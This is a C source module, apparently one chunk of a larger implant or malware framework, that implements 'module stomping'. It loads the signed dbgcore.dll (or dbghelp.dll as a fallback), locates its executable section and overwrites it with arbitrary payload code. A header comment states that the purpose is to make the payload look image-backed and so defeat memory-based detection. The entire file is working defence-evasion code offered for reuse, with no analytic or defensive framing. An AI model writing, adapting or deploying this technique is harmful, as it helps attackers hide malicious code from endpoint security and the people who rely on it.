// chunk: evasion/module_stomp
// depends: (none)
// provides: module_stomp_init, module_stomp_execute
// headers: windows.h
// note: Module stomping — loads a legitimate signed DLL, overwrites its .text section with payload code. Executable region appears image-backed (MEM_IMAGE), defeating VAD-based "unbacked private commit" detection. Uses dbgcore.dll as sacrificial DLL (rarely loaded, large enough .text).

#ifndef CHUNK_MODULE_STOMP
#define CHUNK_MODULE_STOMP

static BYTE *g_stomped_base = NULL;
static DWORD g_stomped_text_size = 0;
static BYTE *g_stomped_text_addr = NULL;

static int module_stomp_init(void) {
    // Load a sacrificial DLL — dbgcore.dll is signed, rarely monitored, has large .text
    HMODULE hMod = LoadLibraryA("dbgcore.dll");
    if (!hMod) {
        hMod = LoadLibraryA("dbghelp.dll");
        if (!hMod) return 0;
    }

    BYTE *base = (BYTE *)hMod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            g_stomped_text_addr = base + sec[i].VirtualAddress;
            g_stomped_text_size = sec[i].Misc.VirtualSize;
            break;
        }
    }

    if (!g_stomped_text_addr || g_stomped_text_size == 0) return 0;

    g_stomped_base = base;
    return 1;
}

// Copy code_buf into the stomped .text section. Returns executable pointer.
// code_size must be <= g_stomped_text_size.
static void *module_stomp_execute(void *code_buf, DWORD code_size) {
    if (!g_stomped_text_addr || code_size > g_stomped_text_size)
        return NULL;

    DWORD old_protect;
    if (!VirtualProtect(g_stomped_text_addr, code_size,
                        PAGE_READWRITE, &old_protect))
        return NULL;

    memcpy(g_stomped_text_addr, code_buf, code_size);

    DWORD dummy;
    VirtualProtect(g_stomped_text_addr, code_size,
                   PAGE_EXECUTE_READ, &dummy);

    return (void *)g_stomped_text_addr;
}

#endif
